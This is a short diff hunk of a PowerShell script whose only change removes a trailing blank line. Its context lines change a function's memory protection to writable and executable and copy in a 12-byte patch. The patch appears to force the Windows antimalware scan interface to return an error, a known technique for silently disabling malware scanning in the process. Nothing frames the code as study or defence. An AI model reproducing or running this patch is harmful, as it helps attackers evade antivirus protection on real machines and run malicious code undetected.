@@ -44,4 +44,3 @@ $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Loo
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 $buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
-
